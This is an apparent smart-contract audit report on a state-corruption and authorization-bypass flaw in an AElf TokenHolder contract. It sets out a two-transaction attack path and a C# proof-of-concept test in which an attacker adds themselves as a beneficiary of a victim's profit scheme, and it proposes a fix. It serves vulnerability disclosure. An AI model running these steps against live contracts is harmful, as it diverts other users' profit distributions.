# Audit Report

## Title
State Corruption and Authorization Bypass in TokenHolder Profit Scheme Management

## Summary
The `UpdateTokenHolderProfitScheme` function contains a critical state corruption bug where it writes scheme data to `State.TokenHolderProfitSchemes[Context.Sender]` instead of `State.TokenHolderProfitSchemes[manager]`. This allows attackers to corrupt their own scheme entry with another manager's scheme data, then exploit the corrupted scheme_id to perform unauthorized beneficiary modifications on victim profit schemes through the TokenHolder contract's elevated privileges in the Profit contract.

## Finding Description

The root cause is in the `UpdateTokenHolderProfitScheme` function where scheme updates are written to the wrong state mapping key. The function receives a `manager` parameter and queries the Profit contract for that manager's scheme information, but then writes the updated scheme to `Context.Sender`'s storage slot instead of the `manager`'s slot. [1](#0-0) 

This function is called from `GetValidScheme` which accepts a `manager` parameter that can differ from `Context.Sender`: [2](#0-1) 

Multiple public entry points call `GetValidScheme` with user-controlled manager addresses. The most critical is `ContributeProfits` which has no authorization check preventing arbitrary scheme_manager specification: [3](#0-2) 

After corrupting their state entry, an attacker can call `AddBeneficiary` which retrieves the attacker's corrupted scheme (containing the victim's SchemeId) and makes privileged calls to the Profit contract: [4](#0-3) 

The Profit contract's authorization checks allow the TokenHolder contract as a trusted system contract alongside the scheme manager: [5](#0-4) 

The same authorization pattern exists for `RemoveBeneficiary`: [6](#0-5) 

## Impact Explanation

This vulnerability enables critical authorization bypass and fund theft:

**Authorization Bypass:** The attacker exploits the TokenHolder contract's elevated privileges to manipulate any profit scheme. The Profit contract trusts calls from the TokenHolder system contract, but the state corruption bug allows attackers to trick TokenHolder into operating on victim schemes.

**Fund Theft Vectors:**
1. **Direct Profit Theft:** Attacker adds themselves as beneficiary with arbitrary shares to victim's profit scheme, receiving a portion of all future profit distributions
2. **Share Dilution:** Attacker can remove legitimate beneficiaries, increasing their own profit share
3. **Complete Takeover:** By manipulating beneficiary lists, attacker redirects profit flows intended for legitimate token holders

**State Integrity Violation:** The victim's `TokenHolderProfitScheme` is never updated correctly, while the attacker's scheme contains incorrect configuration (wrong symbol, lock periods, distribution thresholds). Users who registered under schemes that later get corrupted cannot withdraw correctly due to symbol mismatches: [7](#0-6) 

**Affected Parties:**
- Token holders who rely on profit schemes for dividend distribution
- Legitimate beneficiaries who lose their profit allocations
- Users who locked tokens under schemes that become corrupted

## Likelihood Explanation

**Reachability:** The vulnerability is directly exploitable through the public `ContributeProfits` method. No special permissions are required to call this method with an arbitrary `SchemeManager` address.

**Attack Complexity:** LOW - The attack requires only two transactions:
1. Call `ContributeProfits(victim_address, amount, symbol)` to corrupt the attacker's scheme state with victim's data
2. Call `AddBeneficiary(attacker_address, shares)` to add themselves to the victim's profit scheme

**Preconditions:** 
- Victim must have created a TokenHolder profit scheme (common use case for token dividend distribution)
- Attacker needs minimal token amount and approval for ContributeProfits (corruption persists if transaction succeeds)

**Economic Incentive:** 
- Attack cost: Minimal (gas fees + small token amount for ContributeProfits)
- Potential gain: Share of all future profit distributions to high-value schemes
- Risk/reward ratio is extremely favorable for attackers

**Detection Difficulty:** The state corruption is silent with no events emitted. Unauthorized beneficiary modifications appear as legitimate TokenHolder contract interactions with the Profit contract, making them difficult to distinguish from normal operations in transaction logs.

## Recommendation

Fix the `UpdateTokenHolderProfitScheme` function to write to the correct storage location:

```csharp
private void UpdateTokenHolderProfitScheme(ref TokenHolderProfitScheme scheme, Address manager,
    bool updateSchemePeriod)
{
    if (scheme.SchemeId != null && !updateSchemePeriod) return;
    var originSchemeId = State.ProfitContract.GetManagingSchemeIds.Call(new GetManagingSchemeIdsInput
    {
        Manager = manager
    }).SchemeIds.FirstOrDefault();
    Assert(originSchemeId != null, "Origin scheme not found.");
    var originScheme = State.ProfitContract.GetScheme.Call(originSchemeId);
    scheme.SchemeId = originScheme.SchemeId;
    scheme.Period = originScheme.CurrentPeriod;
    State.TokenHolderProfitSchemes[manager] = scheme; // FIX: Use manager instead of Context.Sender
}
```

Additionally, add authorization checks to functions that accept user-controlled manager addresses to ensure callers can only operate on their own schemes or add explicit access control.

## Proof of Concept

```csharp
// Test demonstrates the vulnerability
[Fact]
public async Task StateCorruptionAndAuthorizationBypass_Test()
{
    // 1. Victim creates a TokenHolder profit scheme
    await VictimStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF",
        MinimumLockMinutes = 100
    });
    
    // 2. Attacker corrupts their state by calling ContributeProfits with victim's address
    await TokenStub.Approve.SendAsync(new ApproveInput 
    { 
        Spender = TokenHolderContractAddress, 
        Symbol = "ELF", 
        Amount = 1 
    });
    
    await AttackerStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = VictimAddress, // User-controlled, no auth check
        Amount = 1,
        Symbol = "ELF"
    });
    
    // 3. Attacker's state now contains victim's SchemeId
    var attackerScheme = await AttackerStub.GetScheme.CallAsync(AttackerAddress);
    var victimScheme = await VictimStub.GetScheme.CallAsync(VictimAddress);
    attackerScheme.SchemeId.ShouldBe(victimScheme.SchemeId); // Same SchemeId!
    
    // 4. Attacker adds themselves as beneficiary using corrupted state
    await AttackerStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = AttackerAddress,
        Shares = 1000000
    });
    
    // 5. Verify attacker is now beneficiary of VICTIM's profit scheme
    var profitDetails = await ProfitStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = victimScheme.SchemeId,
        Beneficiary = AttackerAddress
    });
    
    profitDetails.Details.Count.ShouldBeGreaterThan(0); // Attacker successfully added to victim's scheme
}
```

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L37-68)
```csharp
    public override Empty AddBeneficiary(AddTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);
        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
        var shares = input.Shares;
        if (detail.Details.Any())
        {
            // Only keep one detail.

            State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
            {
                SchemeId = scheme.SchemeId,
                Beneficiary = input.Beneficiary
            });
            shares.Add(detail.Details.Single().Shares);
        }

        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = input.Beneficiary,
                Shares = shares
            }
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L100-129)
```csharp
    public override Empty ContributeProfits(ContributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager);
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = Context.Sender,
            To = Context.Self,
            Symbol = input.Symbol,
            Amount = input.Amount
        });

        State.TokenContract.Approve.Send(new ApproveInput
        {
            Spender = State.ProfitContract.Value,
            Symbol = input.Symbol,
            Amount = input.Amount
        });

        State.ProfitContract.ContributeProfits.Send(new Profit.ContributeProfitsInput
        {
            SchemeId = scheme.SchemeId,
            Symbol = input.Symbol,
            Amount = input.Amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L220-228)
```csharp
        var amount = State.TokenContract.GetLockedAmount.Call(new GetLockedAmountInput
        {
            Address = Context.Sender,
            LockId = lockId,
            Symbol = scheme.Symbol
        }).Amount;

        Assert(State.LockTimestamp[lockId].AddMinutes(scheme.MinimumLockMinutes) < Context.CurrentBlockTime,
            "Cannot withdraw.");
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L278-284)
```csharp
    private TokenHolderProfitScheme GetValidScheme(Address manager, bool updateSchemePeriod = false)
    {
        var scheme = State.TokenHolderProfitSchemes[manager];
        Assert(scheme != null, "Token holder profit scheme not found.");
        UpdateTokenHolderProfitScheme(ref scheme, manager, updateSchemePeriod);
        return scheme;
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L286-299)
```csharp
    private void UpdateTokenHolderProfitScheme(ref TokenHolderProfitScheme scheme, Address manager,
        bool updateSchemePeriod)
    {
        if (scheme.SchemeId != null && !updateSchemePeriod) return;
        var originSchemeId = State.ProfitContract.GetManagingSchemeIds.Call(new GetManagingSchemeIdsInput
        {
            Manager = manager
        }).SchemeIds.FirstOrDefault();
        Assert(originSchemeId != null, "Origin scheme not found.");
        var originScheme = State.ProfitContract.GetScheme.Call(originSchemeId);
        scheme.SchemeId = originScheme.SchemeId;
        scheme.Period = originScheme.CurrentPeriod;
        State.TokenHolderProfitSchemes[Context.Sender] = scheme;
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L171-174)
```csharp
        Assert(
            Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager can add beneficiary.");
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L237-239)
```csharp
        Assert(Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager or token holder contract can add beneficiary.");
```
